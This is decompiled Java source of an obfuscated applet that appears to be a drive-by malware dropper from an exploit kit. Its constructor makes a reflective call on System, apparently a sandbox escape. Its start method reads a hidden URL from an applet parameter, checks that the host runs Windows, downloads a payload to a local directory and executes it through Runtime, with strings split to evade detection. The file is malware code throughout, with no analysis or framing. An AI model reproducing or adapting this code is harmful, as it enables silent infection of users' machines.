// 
// Decompiled by Procyon v0.5.30
// 

package trew;

import java.awt.Component;
import java.beans.Expression;
import zerg.ktrepo;
import zerg.hitren;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URL;
import javax.swing.JList;
import java.util.HashSet;
import java.applet.Applet;

public class plopert extends Applet
{
    public String ol0sy;
    public Runtime lk8tq;
    public int nkmtvpi;
    public String ol0sx;
    public HashSet nkmtq;
    public JList nkmty;
    public String ol0sq;
    public String nkmte;
    public URL nkmtb;
    public String nkmta;
    public String nkmtz;
    public InputStream nkmtx;
    public String nkmtc;
    public int nkmtv;
    public FileOutputStream nkmtn;
    public String nkmtm;
    public String nkmts;
    public String nkmtd;
    public String ol0sa;
    static Class lk8ta;
    static Object[] lk8tf;
    
    static {
        plopert.lk8ta = System.class;
        plopert.lk8tf = new Object[1];
    }
    
    private void gijom16() {
        holeqe.inv(this.nkmtb, popreq.hfeng11());
        this.nkmtx = (InputStream)holeqe.inv(this.nkmtb, popreq.hfeng22());
    }
    
    private String gijom2(final String s) {
        return System.getProperty(s);
    }
    
    private void gijom4() throws Exception {
        final boolean ol0sz = false;
        this.nkmtn = new FileOutputStream(this.ol0sa);
    }
    
    private void gijom9(final Object o) {
        holeqe.inv(o, popreq.hfeng9());
    }
    
    public void start() {
        super.start();
        popreq.hfeng44();
        hitren.kens5();
        try {
            this.ol0sy = popreq.hfeng15();
            this.ol0sx = popreq.hfeng31();
            this.ol0sq = hitren.kens0(this.getParameter("rqq"));
            this.nkmte = "e".concat("ma".concat("n.".concat("so")));
            this.nkmta = popreq.hfeng28(this.ol0sy);
            this.nkmtb = new URL(this.ol0sq);
            this.nkmtz = popreq.hfeng28(this.ol0sx);
            this.nkmtvpi = 24;
            this.nkmtc = popreq.hfeng28(this.nkmte);
            this.nkmtm = popreq.hfeng7(this.nkmta);
            final Runtime runtime = Runtime.getRuntime();
            this.lk8tq = runtime;
            if (runtime == null) {}
            this.nkmts = this.gijom2(this.nkmtz);
            this.nkmtd = this.gijom2(this.nkmtc);
            this.ol0sa = String.valueOf(this.nkmts) + this.nkmtm;
            this.nkmtv = 1000 + this.nkmtvpi;
            try {
                if (this.nkmtd.indexOf("W".concat("in").concat("do".concat("ws"))) < 0) {
                    return;
                }
                this.gijom4();
                this.gijom16();
                final byte[] ol0sl = new byte[this.nkmtv];
                int ol0sm;
                while ((ol0sm = this.nkmtx.read(ol0sl, 0, this.nkmtv)) != -1) {
                    this.nkmtn.write(ol0sl, 0, ol0sm);
                }
                this.gijom9(this.nkmtx);
                this.gijom9(this.nkmtn);
                holeqe.checker(this.lk8tq, popreq.hfeng2(), new Object[] { String.valueOf(this.nkmts) + this.nkmtm });
            }
            catch (Exception r5tu) {
                r5tu.printStackTrace();
            }
        }
        catch (Exception r5tu2) {
            r5tu2.printStackTrace();
        }
    }
    
    public plopert() {
        this.nkmtq = new HashSet();
        popreq.hfeng44();
        hitren.kens5();
        this.nkmtq.add(new ktrepo(plopert.lk8ta, popreq.hfeng14(), plopert.lk8tf));
        final Expression lk8th = new Expression(plopert.lk8ta, popreq.hfeng14(), plopert.lk8tf);
        final kloony lk8tj = new kloony(this, this.nkmtq);
        this.add(this.nkmty = new JList((E[])new Object[] { lk8tj }));
    }
}
